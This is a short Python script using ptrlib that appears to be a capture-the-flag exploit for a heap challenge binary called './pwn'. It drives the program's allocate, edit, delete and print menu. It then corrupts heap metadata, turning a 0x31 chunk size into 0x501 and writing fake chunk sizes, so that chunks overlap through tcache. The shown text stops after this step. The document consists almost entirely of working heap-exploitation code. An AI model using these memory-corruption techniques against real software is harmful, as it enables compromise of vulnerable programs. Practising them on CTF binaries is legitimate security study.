from ptrlib import *

def alloc(size, data):
    sock.recvuntil("> ")
    sock.sendline("1")
    sock.recvuntil("size: ")
    sock.sendline(str(size))
    sock.recvuntil("data: ")
    sock.send(data)

def edit(index, byte):
    sock.recvuntil("> ")
    sock.sendline("2")
    sock.recvuntil("index: ")
    sock.sendline(str(index))
    sock.recvuntil("byte: ")
    sock.send(str(byte))

def delete():
    sock.recvuntil("> ")
    sock.sendline("3")

def print_name():
    sock.recvuntil("> ")
    sock.sendline("4")
    sock.recvuntil("pwner: ")
    return sock.recvline().rstrip()

libc = ELF("./libc.so.6")
elf = ELF("./pwn")
sock = Process("./pwn")
main_arena = 0x3ebc40
delta = 1168

# Name
sock.recvuntil("name: ")
sock.sendline("taro")

# Chunk overlap
alloc(0x18, "B" * 0x18)
delete() # push to tcache
alloc(0x28, "A" * 0x28)
delete()
alloc(0x18, "B" * 0x18)
edit(0x18, 0x01) # 0x31 --> 0x01
edit(0x19, 0x05) # 0x01 --> 0x501
edit(0x18 + 0x500, 0x31) # fake chunk size
edit(0x18 + 0x500 + 0x30, 0x31)
alloc(0x28, "A" * 0x18)
delete() # pon!

